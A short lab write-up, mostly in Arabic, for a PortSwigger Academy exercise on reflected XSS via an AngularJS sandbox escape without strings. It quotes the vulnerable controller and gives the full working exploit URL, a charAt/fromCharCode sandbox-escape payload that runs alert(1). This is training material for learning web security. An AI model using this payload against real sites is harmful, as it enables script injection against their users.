# Lab : Reflected XSS with Angular JS sandbox escape without strings

https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings

- الفكره من الLab ده انك تعرف تهرب من البيئه الحمايه الخاصه بangular بدون استخدام function مساعده ذيevel ومن غير string

```bash
1.  angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) { $scope.query = {}; var key = 'search'; $scope.query[key] = 'test'; $scope.value = $parse(key)($scope.query); });

2. دي المود الي بدخل فيه الامر بتاع البحث وهو الكود المصاب الي المفروض هنستغله 

3.  var key = 'search'; دي الي هنلعب عليها 

4. علشان نهرب من الfunction التانيه ونروح للfunction الي احناعاوزنها هنستخدم الطريقه دي

5. 1&{ we write logic code علشان نعرف الموقع هل هو مصاب بجد ولا كله علي الفاضي وهيتكتب هنا كود الاستغلال كمان 1+1}=10

6. angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) { $scope.query = {}; var key = 'search'; $scope.query[key] = '1'; $scope.value = $parse(key)($scope.query); var key = '1+1'; $scope.query[key] = '10'; $scope.value = $parse(key)($scope.query); });

7.https://0ab700fd04fd8eab807e9e59004f006d.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1

8. كود الاستغلال هتجيبه من cheatsheet الخاص بportswigger 
```
